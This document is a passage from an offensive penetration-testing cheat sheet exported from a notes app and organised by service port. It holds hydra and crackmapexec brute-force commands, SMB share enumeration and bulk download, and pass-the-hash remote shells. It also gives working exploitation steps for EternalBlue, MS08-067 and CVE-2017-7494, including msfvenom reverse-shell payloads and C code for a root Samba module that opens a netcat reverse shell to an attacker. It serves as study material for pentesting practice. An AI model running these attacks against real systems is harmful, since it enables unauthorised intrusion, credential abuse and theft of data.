<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/swisskyrepo/PayloadsAllTheThings</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/swisskyrepo/</span>PayloadsAllTheThings</code></pre></div>
<h3 id="upload-a-file-with-put">Upload a file with PUT</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">curl -X PUT http://&lt;IP&gt;/&lt;FILE&gt; -d @&lt;FILE&gt;  -v</pre><pre class="hljs"><code>curl -X PUT http://<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">FILE</span>&gt;</span> -d @<span class="hljs-tag">&lt;<span class="hljs-name">FILE</span>&gt;</span>  -v</code></pre></div>
<hr>
<h2 id="kerberos-88">KERBEROS - 88</h2>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://www.tarlogic.com/en/blog/how-to-attack-kerberos/</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//</span>www.tarlogic.com<span class="hljs-regexp">/en/</span>blog<span class="hljs-regexp">/how-to-attack-kerberos/</span></code></pre></div>
<hr>
<h2 id="pop3-110">POP3 - 110</h2>
<h3 id="brute-force-4">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">hydra -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; pop3 -V
hydra -S -v -l &lt;USER&gt; -P &lt;PASSWORDS_LIST&gt; -s 995 -f &lt;IP&gt; pop3 -V</pre><pre class="hljs"><code>hydra -l <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> -f <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> pop3 -V
hydra -S -v -l <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> -s 995 -f <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> pop3 -V</code></pre></div>
<h3 id="read-mail">Read mail</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">telnet &lt;IP&gt; 110

USER &lt;USER&gt;
PASS &lt;PASSWORD&gt;
LIST
RETR &lt;MAIL_NUMBER&gt;
QUIT</pre><pre class="hljs"><code>telnet <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> 110

USER <span class="hljs-tag">&lt;<span class="hljs-name">USER</span>&gt;</span>
PASS <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORD</span>&gt;</span>
LIST
RETR <span class="hljs-tag">&lt;<span class="hljs-name">MAIL_NUMBER</span>&gt;</span>
QUIT</code></pre></div>
<hr>
<h2 id="snmp-161">SNMP - 161</h2>
<h3 id="brute-force-community-string">Brute force community string</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;</pre><pre class="hljs"><code>onesixtyone -c <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/SNMP/</span>common-snmp-community-strings-onesixtyone.txt &lt;IP&gt;</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">snmpbulkwalk -c &lt;COMMUNITY_STRING&gt; -v&lt;VERSION&gt; &lt;IP&gt;</pre><pre class="hljs"><code>snmpbulkwalk -c <span class="hljs-tag">&lt;<span class="hljs-name">COMMUNITY_STRING</span>&gt;</span> -v<span class="hljs-tag">&lt;<span class="hljs-name">VERSION</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span></code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">snmp-check &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-symbol">snmp</span>-check &lt;<span class="hljs-built_in">IP</span>&gt;</code></pre></div>
<h3 id="modifying-snmp-values">Modifying SNMP values</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">http://net-snmp.sourceforge.net/tutorial/tutorial-5/commands/snmpset.html</pre><pre class="hljs"><code>http:<span class="hljs-regexp">//</span>net-snmp.sourceforge.net<span class="hljs-regexp">/tutorial/</span>tutorial-<span class="hljs-number">5</span><span class="hljs-regexp">/commands/</span>snmpset.html</code></pre></div>
<hr>
<h2 id="ldap-389">LDAP - 389</h2>
<h3 id="scans">Scans</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmap -n -sV --script &quot;ldap* and not brute&quot;

ldapsearch -x -H ldap://10.10.10.161 -D '' -w '' -b &quot;DC=htb,DC=local&quot; | grep 'userPr\|svc'
ldapsearch -h &lt;IP&gt; -x -s base
ldapsearch -h &lt;IP&gt; -x -D '&lt;DOMAIN&gt;\&lt;USER&gt;' -w '&lt;PASSWORD&gt;' -b &quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</pre><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -n -sV --script <span class="hljs-string">&quot;ldap* and not brute&quot;</span>

ldapsearch -<span class="hljs-keyword">x</span> -H ldap://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span> -D <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">w</span> <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=htb,DC=local&quot;</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&#x27;userPr\|svc&#x27;</span>
ldapsearch -h <span class="hljs-symbol">&lt;IP&gt;</span> -<span class="hljs-keyword">x</span> -s base
ldapsearch -h <span class="hljs-symbol">&lt;IP&gt;</span> -<span class="hljs-keyword">x</span> -D <span class="hljs-string">&#x27;&lt;DOMAIN&gt;\&lt;USER&gt;&#x27;</span> -<span class="hljs-keyword">w</span> <span class="hljs-string">&#x27;&lt;PASSWORD&gt;&#x27;</span> -<span class="hljs-keyword">b</span> <span class="hljs-string">&quot;DC=&lt;1_SUBDOMAIN&gt;,DC=&lt;TDL&gt;&quot;</span></code></pre></div>
<h3 id="graphical-interface">Graphical Interface</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">jxplorer</pre><pre class="hljs"><code><span class="hljs-attribute">jxplorer</span></code></pre></div>
<hr>
<h2 id="smb-445">SMB - 445</h2>
<h3 id="version-if-nmap-didnt-detect-it">Version if nmap didn't detect it</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">Sometimes nmap doesn’t show the version of Samba in the remote host, if this happens, a good way to know which version the remote host is running, is to capture traffic with wireshark against the remote host on 445/139 and in parallel run an smbclient -L, do a follow tcp stream and with this we might see which version the server is running.

OR

sudo ngrep -i -d &lt;INTERFACE&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -L &lt;IP&gt;</pre><pre class="hljs"><code>Sometimes nmap doesn’t <span class="hljs-keyword">show</span> the <span class="hljs-keyword">version</span> <span class="hljs-keyword">of</span> Samba <span class="hljs-keyword">in</span> the remote host, <span class="hljs-keyword">if</span> this happens, a good way <span class="hljs-keyword">to</span> know which <span class="hljs-keyword">version</span> the remote host <span class="hljs-keyword">is</span> running, <span class="hljs-keyword">is</span> <span class="hljs-keyword">to</span> capture traffic <span class="hljs-keyword">with</span> wireshark against the remote host <span class="hljs-keyword">on</span> <span class="hljs-number">445</span>/<span class="hljs-number">139</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">in</span> parallel run an smbclient -L, <span class="hljs-keyword">do</span> a follow tcp stream <span class="hljs-keyword">and</span> <span class="hljs-keyword">with</span> this we might see which <span class="hljs-keyword">version</span> the <span class="hljs-keyword">server</span> <span class="hljs-keyword">is</span> running.

<span class="hljs-keyword">OR</span>

sudo ngrep -i -d &lt;INTERFACE&gt; <span class="hljs-string">&#x27;s.?a.?m.?b.?a.*[[:digit:]]&#x27;</span> port <span class="hljs-number">139</span>
smbclient -L &lt;IP&gt;</code></pre></div>
<h3 id="scan-for-vulnerability">Scan for vulnerability</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">nmap -p139,445 --script &quot;smb-vuln-* and not(smb-vuln-regsvc-dos)&quot; --script-args smb-vuln-cve-2017-7494.check-version,unsafe=1 &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-attribute">nmap</span> -p139,<span class="hljs-number">445</span> --script <span class="hljs-string">&quot;smb-vuln-* and not(smb-vuln-regsvc-dos)&quot;</span> --script-args smb-vuln-cve-<span class="hljs-number">2017</span>-<span class="hljs-number">7494</span>.check-version,unsafe=<span class="hljs-number">1</span> &lt;IP&gt;</code></pre></div>
<p>If :</p>
<ul>
<li>MS17-010 - <a data-from-md title='MS17-010' href='#EternalBlue'>EternalBlue</a></li>
<li>MS08-067 - <a data-from-md title='#MS08-067' href='#MS08-067'>MS08-067</a></li>
<li>CVE-2017-7494 - <a data-from-md title='#CVE-2017-7494' href='#CVE-2017-7494'>CVE-2017-7494</a></li>
</ul>
<h3 id="manual-testing">Manual testing</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">smbmap -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt;
smbmap -u 'guest' -p '' -H &lt;IP&gt;
smbmap -u '' -p '' -H &lt;IP&gt; -R

crackmapexec smb &lt;IP&gt;
crackmapexec smb &lt;IP&gt; -u '' -p ''
crackmapexec smb &lt;IP&gt; -u 'guest' -p ''
crackmapexec smb &lt;IP&gt; -u '' -p '' --shares

enum4linux -a &lt;IP&gt;

smbclient --no-pass -L //$IP
smbclient //&lt;IP&gt;/&lt;SHARE&gt;

# Download all files from a directory recursively
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt; -c &quot;prompt OFF;recurse ON;mget *&quot;</pre><pre class="hljs"><code>smbmap -H <span class="hljs-symbol">&lt;IP&gt;</span>
smbmap -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span> -H <span class="hljs-symbol">&lt;IP&gt;</span>
smbmap -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;guest&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span> -H <span class="hljs-symbol">&lt;IP&gt;</span>
smbmap -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span> -H <span class="hljs-symbol">&lt;IP&gt;</span> -R

crackmapexec smb <span class="hljs-symbol">&lt;IP&gt;</span>
crackmapexec smb <span class="hljs-symbol">&lt;IP&gt;</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span>
crackmapexec smb <span class="hljs-symbol">&lt;IP&gt;</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;guest&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span>
crackmapexec smb <span class="hljs-symbol">&lt;IP&gt;</span> -<span class="hljs-keyword">u</span> <span class="hljs-string">&#x27;&#x27;</span> -<span class="hljs-keyword">p</span> <span class="hljs-string">&#x27;&#x27;</span> --shares

enum4linux -<span class="hljs-keyword">a</span> <span class="hljs-symbol">&lt;IP&gt;</span>

smbclient --<span class="hljs-keyword">no</span>-pass -L //$IP
smbclient //<span class="hljs-symbol">&lt;IP&gt;</span>/<span class="hljs-symbol">&lt;SHARE&gt;</span>

# Download <span class="hljs-keyword">all</span> <span class="hljs-keyword">files</span> from <span class="hljs-keyword">a</span> directory recursively
smbclient //<span class="hljs-symbol">&lt;IP&gt;</span>/<span class="hljs-symbol">&lt;SHARE&gt;</span> -U <span class="hljs-symbol">&lt;USER&gt;</span> -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;prompt OFF;recurse ON;mget *&quot;</span></code></pre></div>
<h3 id="brute-force-5">Brute force</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">crackmapexec smb &lt;IP&gt; -u &lt;USERS_LIST&gt; -p &lt;PASSWORDS_LIST&gt;
hydra -V -f -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; smb://&lt;IP&gt; -u -vV</pre><pre class="hljs"><code>crackmapexec smb <span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -p <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span>
hydra -V -f -L <span class="hljs-tag">&lt;<span class="hljs-name">USERS_LIST</span>&gt;</span> -P <span class="hljs-tag">&lt;<span class="hljs-name">PASSWORDS_LIST</span>&gt;</span> smb://<span class="hljs-tag">&lt;<span class="hljs-name">IP</span>&gt;</span> -u -vV</code></pre></div>
<h3 id="mount-a-smb-share">Mount a SMB share</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">
sudo mount -t cifs //&lt;IP&gt;/&lt;SHARE&gt; /mnt
sudo mount -t cifs -o 'username=&lt;USER&gt;,password=&lt;PASSWORD&gt;'//&lt;IP&gt;/&lt;SHARE&gt; /mnt

# Mount as a guest 
sudo mount -t cifs -o &lt;permissions&gt;,guest //&lt;IP&gt;/&lt;SHARE&gt; /mnt

smbclient //&lt;IP&gt;/&lt;SHARE&gt;
smbclient //&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;</pre><pre class="hljs"><code>
sudo mount -t cifs <span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/&lt;SHARE&gt; /m</span>nt
sudo mount -t cifs -o <span class="hljs-string">&#x27;username=&lt;USER&gt;,password=&lt;PASSWORD&gt;&#x27;</span><span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/&lt;SHARE&gt; /m</span>nt

<span class="hljs-comment"># Mount as a guest </span>
sudo mount -t cifs -o &lt;permissions&gt;,guest <span class="hljs-regexp">//</span>&lt;IP&gt;<span class="hljs-regexp">/&lt;SHARE&gt; /m</span>nt

smbclient <span class="hljs-regexp">//</span>&lt;IP&gt;/&lt;SHARE&gt;
smbclient <span class="hljs-regexp">//</span>&lt;IP&gt;/&lt;SHARE&gt; -U &lt;USER&gt;</code></pre></div>
<h3 id="mount-any">Mount any</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># guestmount can mount any kind of disk file
sudo apt-get install libguestfs-tools
guestmount --add yourVirtualDisk.vhdx --inspector --ro /mnt/anydirectory
</pre><pre class="hljs"><code><span class="hljs-comment"># guestmount can mount any kind of disk file</span>
sudo apt-get install libguestfs-tools
guestmount <span class="hljs-params">--add</span> yourVirtualDisk.vhdx <span class="hljs-params">--inspector</span> <span class="hljs-params">--ro</span> <span class="hljs-string">/mnt/anydirectory</span>
</code></pre></div>
<h3 id="get-a-shell">Get a shell</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
psexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
wmiexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;
smbexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;

atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt; &lt;COMMAND&gt;
atexec.py &lt;DOMAIN&gt;/&lt;USER&gt;@&lt;IP&gt; -hashes :&lt;NTHASH&gt;</pre><pre class="hljs"><code>psexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>:<span class="hljs-symbol">&lt;PASSWORD&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span>
psexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span> -hashes :<span class="hljs-symbol">&lt;NTHASH&gt;</span>

wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>:<span class="hljs-symbol">&lt;PASSWORD&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span>
wmiexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span> -hashes :<span class="hljs-symbol">&lt;NTHASH&gt;</span>

smbexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>:<span class="hljs-symbol">&lt;PASSWORD&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span>
smbexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span> -hashes :<span class="hljs-symbol">&lt;NTHASH&gt;</span>

atexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>:<span class="hljs-symbol">&lt;PASSWORD&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span> <span class="hljs-symbol">&lt;COMMAND&gt;</span>
atexec.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;DOMAIN&gt;</span>/<span class="hljs-symbol">&lt;USER&gt;</span>@<span class="hljs-symbol">&lt;IP&gt;</span> -hashes :<span class="hljs-symbol">&lt;NTHASH&gt;</span></code></pre></div>
<h3 id="upload-with-smbmap">Upload with SMBMap</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">smbmap -H &lt;HOST&gt; --upload '&lt;TOBEUPLOADED&gt;' '&lt;PATH&gt;/&lt;UPLOADNAME&gt;' </pre><pre class="hljs"><code>smbmap -H <span class="hljs-tag">&lt;<span class="hljs-name">HOST</span>&gt;</span> --upload &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">TOBEUPLOADED</span>&gt;</span>&#x27; &#x27;<span class="hljs-tag">&lt;<span class="hljs-name">PATH</span>&gt;</span>/<span class="hljs-tag">&lt;<span class="hljs-name">UPLOADNAME</span>&gt;</span>&#x27; </code></pre></div>
<h3 id="eternalblue-ms17-010">EternalBlue (MS17-010)</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">https://github.com/3ndG4me/AutoBlue-MS17-010</pre><pre class="hljs"><code>https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/3ndG4me/</span>AutoBlue-MS17-<span class="hljs-number">010</span></code></pre></div>
<h4 id="check-if-vulnerable">Check if vulnerable</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python eternal_checker.py &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-keyword">python</span> eternal_checker.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;IP&gt;</span></code></pre></div>
<h4 id="prepare-shellcodes-and-listeners">Prepare shellcodes and listeners</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">cd shellcode
./shell_prep.sh
cd ..
./listener_prep.sh</pre><pre class="hljs"><code><span class="hljs-keyword">cd</span> shellcode
<span class="hljs-string">./shell_prep.sh</span>
<span class="hljs-keyword">cd</span> <span class="hljs-string">..</span>
<span class="hljs-string">./listener_prep.sh</span></code></pre></div>
<h4 id="exploit">Exploit</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python eternalblue_exploit&lt;NUMBER&gt;.py &lt;IP&gt; shellcode/sc_all.bin

May need to run it multiple times</pre><pre class="hljs"><code><span class="hljs-keyword">python</span> eternalblue_exploit<span class="hljs-symbol">&lt;NUMBER&gt;</span>.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;IP&gt;</span> shellcode/sc_all.bin

May need <span class="hljs-keyword">to</span> run it multiple times</code></pre></div>
<h4 id="if-this-doesnt-work-try-this-one">If this doesn't work, try this one</h4>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">python zzz_exploit.py &lt;IP&gt;</pre><pre class="hljs"><code><span class="hljs-keyword">python</span> zzz_exploit.<span class="hljs-keyword">py</span> <span class="hljs-symbol">&lt;IP&gt;</span></code></pre></div>
<h3 id="ms08-067">MS08-067</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Download exploit code
git clone https://github.com/andyacer/ms08_067.git

# Generate payload
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows
msfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b &quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot; -f c -a x86 --platform windows

# Modify
Modify ms08_067_2018.py and replace the shellcode variable by the one generated with msfvenom.

# Listener
nc -lvp &lt;PORT&gt;

# Exploit
python ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; 445</pre><pre class="hljs"><code><span class="hljs-comment"># Download exploit code</span>
git clone <span class="hljs-keyword">https</span>://github.com/andyacer/ms08_067.git

<span class="hljs-comment"># Generate payload</span>
msfvenom -p windows/shell_reverse_tcp LHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b <span class="hljs-string">&quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot;</span> -f c -<span class="hljs-keyword">a</span> x86 <span class="hljs-comment">--platform windows</span>
msfvenom -p windows/shell_bind_tcp RHOST=&lt;IP&gt; LPORT=&lt;PORT&gt; EXITFUNC=thread -b <span class="hljs-string">&quot;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&quot;</span> -f c -<span class="hljs-keyword">a</span> x86 <span class="hljs-comment">--platform windows</span>

<span class="hljs-comment"># Modify</span>
Modify ms08_067_2018.py <span class="hljs-keyword">and</span> <span class="hljs-built_in">replace</span> <span class="hljs-keyword">the</span> shellcode <span class="hljs-built_in">variable</span> <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">one</span> generated <span class="hljs-keyword">with</span> msfvenom.

<span class="hljs-comment"># Listener</span>
nc -lvp &lt;PORT&gt;

<span class="hljs-comment"># Exploit</span>
python ms08_067_2018.py &lt;IP&gt; &lt;NUMBER&gt; <span class="hljs-number">445</span></code></pre></div>
<h3 id="cve-2017-7494">CVE-2017-7494</h3>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Download exploit code
git clone https://github.com/joxeankoret/CVE-2017-7494</pre><pre class="hljs"><code><span class="hljs-comment"># Download exploit code</span>
git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/joxeankoret/</span>CVE-<span class="hljs-number">2017</span>-<span class="hljs-number">7494</span></code></pre></div>
<p>Create a new file named poc.c :</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
    setresuid(0,0,0);
    system(&quot;ping -c 3 &lt;IP&gt;&quot;);
}</pre><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">samba_init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
</span>{
    <span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;ping -c 3 &lt;IP&gt;&quot;</span>);
}</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Build
gcc -o test.so -shared poc.c -fPIC</pre><pre class="hljs"><code><span class="hljs-comment"># Build</span>
gcc -o <span class="hljs-keyword">test</span>.so -shared poc.c -fPIC</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Start an ICMP listener
sudo tcpdump -i &lt;INTERFACE&gt; icmp

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so</pre><pre class="hljs"><code><span class="hljs-comment"># Start an ICMP listener</span>
sudo tcpdump -i <span class="hljs-variable">&lt;INTERFACE&gt;</span> icmp

<span class="hljs-comment"># Exploit</span>
./cve_2017_7494.py -t <span class="hljs-variable">&lt;TARGET_IP&gt;</span> -u <span class="hljs-variable">&lt;USER&gt;</span> -P <span class="hljs-variable">&lt;PASSWORD&gt;</span> --custom=test.so</code></pre></div>
<p>If you reiceve 3 pings on your listener then the exploit works. Now let's get a shell :</p>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

int samba_init_module(void)
{
    setresuid(0,0,0);
    system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&quot;);
}</pre><pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>

<span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">samba_init_module</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>
</span>{
    <span class="hljs-built_in">setresuid</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);
    <span class="hljs-built_in">system</span>(<span class="hljs-string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;IP&gt; &lt;PORT&gt; &gt;/tmp/f&quot;</span>);
}</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Build
gcc -o test.so -shared poc.c -fPIC</pre><pre class="hljs"><code><span class="hljs-comment"># Build</span>
gcc -o <span class="hljs-keyword">test</span>.so -shared poc.c -fPIC</code></pre></div>
<div class="joplin-editable"><pre class="joplin-source" data-joplin-language="" data-joplin-source-open="```&#10;" data-joplin-source-close="&#10;```"># Start a listener
nc -lvp &lt;PORT&gt;

# Exploit
./cve_2017_7494.py -t &lt;TARGET_IP&gt; -u &lt;USER&gt; -P &lt;PASSWORD&gt; --custom=test.so</pre><pre class="hljs"><code><span class="hljs-comment"># Start a listener</span>
nc -lvp <span class="hljs-variable">&lt;PORT&gt;</span>

<span class="hljs-comment"># Exploit</span>
